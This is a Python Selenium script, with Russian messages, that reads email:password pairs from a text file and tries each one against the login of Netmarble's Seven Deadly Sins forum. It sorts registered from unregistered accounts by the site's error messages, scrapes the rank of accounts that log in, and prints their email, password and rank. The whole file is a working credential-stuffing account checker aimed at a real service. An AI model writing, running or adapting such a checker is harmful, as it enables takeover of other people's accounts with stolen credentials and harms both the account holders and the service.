from selenium.webdriver.common.by import By
import time
from selenium import webdriver
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from bs4 import BeautifulSoup
from selenium.common.exceptions import NoSuchElementException


def check_account_valide(web_url, driver, email, password):
    driver.get(url=web_url)
    time.sleep(0.5)

    wait = WebDriverWait(driver, 10)

    login_button = wait.until(ec.element_to_be_clickable((By.XPATH, "//a[@id='gnbBtnLogin']")))
    login_button.click()
    time.sleep(2)

    driver.execute_script("document.body.style.zoom='70%'")

    login_on_mail = wait.until(ec.visibility_of_element_located((By.XPATH, "//a[em[@class='ic_sns ic_email']]")))
    driver.execute_script("arguments[0].click();", login_on_mail)
    time.sleep(2)

    email_input = driver.find_element(By.XPATH, "//input[@name='mailAddress']")
    email_input.clear()
    email_input.send_keys(email)
    time.sleep(1)

    password_input = driver.find_element(By.XPATH, "//input[@name='password']")
    password_input.clear()
    password_input.send_keys(password)
    time.sleep(1)

    login_button = driver.find_element(By.XPATH, "//a[@id='btnLogin']")
    login_button.click()
    time.sleep(3)

    error_message = driver.find_elements(By.XPATH, "//*[@id='popAlertMessage']/div")
    if len(error_message) > 0 and error_message[
        0].text == 'Данный адрес электронной почты не зарегистрирован. Проверьте и повторите попытку.':
        print('Данные не валид, едем дальше!')
        return None

    try:
        error_message2 = driver.find_element(By.XPATH, '//div[@class="cmn_alert"]/p')
        if error_message2.text == 'Можно использовать, создав персонажа в игре.':
            print('Данные не валид, едем дальше!')
            return None
    except NoSuchElementException:
        pass

    img_button = driver.find_element(By.XPATH, "//a[@class='btn_profile']")
    img_button.click()
    time.sleep(1)

    profile_button = driver.find_element(By.XPATH, "//a[em[@class='ic ic_profile']]")
    profile_button.click()
    time.sleep(3)

    html_code = driver.page_source

    soup = BeautifulSoup(html_code, 'lxml')

    rank = soup.find('dd', class_='t3')
    rank_text = rank.text
    rank_number = rank_text.split('|')[-1].strip()

    return rank_number

def main():
    url = 'https://forum.netmarble.com/7ds_en/'
    option = webdriver.ChromeOptions()
    option.add_argument("--start-maximized")
    driver = webdriver.Chrome(options=option)

    try:
        with open('ЧекГРЕХИ13.03.2023.txt', 'r', encoding='utf-8') as file:
            strings = file.read().splitlines()

        print('Сейчас чекаеться 1 аккаунт....\n')

        item = 0
        while item < 5:
            email, password = strings[item].split(':')
            rank = check_account_valide(url, driver, email, password)

            if rank is not None:
                print(f"Ранк игрока: {rank}\nПочта: {email}\nПароль: {password}\n")

            item += 1

            if item != 5:
                print(f"Сейчас чекаеться {item+1} аккаунт....\n")
                driver.quit()
                driver = webdriver.Chrome(options=option)
    except Exception as ex:
        print(ex)
    finally:
        driver.quit()


if __name__ == '__main__':
    main()
